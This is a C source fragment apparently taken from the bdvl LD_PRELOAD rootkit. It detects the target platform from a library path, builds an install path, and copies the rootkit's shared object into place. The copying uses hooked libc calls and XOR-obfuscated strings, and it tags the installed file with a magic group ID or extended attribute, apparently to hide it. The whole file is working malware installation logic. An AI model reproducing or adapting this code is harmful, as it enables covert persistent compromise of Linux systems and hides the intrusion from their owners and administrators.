/* example: isplatform(pathname, "x86_64") || isplatform(pathname, "v7l")
 * pathname refers to a bdvl.so.$PLATFORM */
int isplatform(const char *sopath, const char *platform){
    char *pf = strrchr(sopath, '.') + 1;
    if(!pf) return 0;
    pf += strncmp("arm", pf, 3) == 0 ? 3 : 0;
    return strcmp(pf, platform) == 0;
}

/* returns a pointer to the platform string found at the end of sopath.
 * NULL is returned if a platform string couldn't be identified. */
char *sogetplatform(const char *sopath){
    char *cf = NULL, *pf = strrchr(sopath, '.') + 1;
    int rv = 0;
    for(size_t i = 0; i < VALID_PLATFORMS_SIZE && !rv; i++){
        pf += strncmp("arm", pf, 3) == 0 ? 3 : 0;
        cf = xordup(valid_platforms[i]);
        if(!cf) continue;
        rv = strcmp(pf, cf) == 0;
        !rv ? clean(cf) : 0;
    }
    return cf;
}

/* returns a pointer to a string of a new path for sopath, into installdir named bdvlso. */
char *sogetpath(const char *sopath, const char *installdir, const char *bdvlso){
    char *platform = sogetplatform(sopath);
    if(platform == NULL) return NULL;

    const size_t pathsize = strlen(installdir) + strlen(bdvlso) + strlen(platform) + 4;
    char *ret = malloc(pathsize);
    if(ret) snprintf(ret, pathsize, "%s/%s.%s", installdir, bdvlso, platform);
    clean(platform);
    return ret;
}

int socopy(const char *opath, char *npath, const id_t magicid){
    FILE *ofp, *nfp;
    size_t n, m;
    mode_t somode;
    u_long fsize;

    hook(CFWRITE, CCHMOD, CFREAD);

    ofp = bindup(opath, npath, &nfp, &fsize, &somode);
    if(ofp == NULL) return -1;

    u_long blksize = getablocksize(fsize);
    do{
        unsigned char *buf = malloc(blksize+1);
        if(!buf){
            fcloser(2, ofp, nfp);
            return -1;
        }
        memset(buf, 0, blksize+1);
        n = (size_t)call(CFREAD, buf, 1, blksize, ofp);
        if(n){
            m = (long)call(CFWRITE, buf, 1, n, nfp);
            fflush(nfp);
        }else m = 0;
        fflush(ofp);
        bfree(buf, blksize+1);
    }while(n > 0 && n == m);
    fcloser(2, ofp, nfp);

#ifdef USE_MAGIC_ATTR
    if(attrmodif(npath, CSETXATTR) < 0)
        return -1;
#else
    if(chownpath(npath, magicid) < 0)
        return -1;
#endif

    if((long)call(CCHMOD, npath, somode) < 0)
        return -1;

    return 1;
}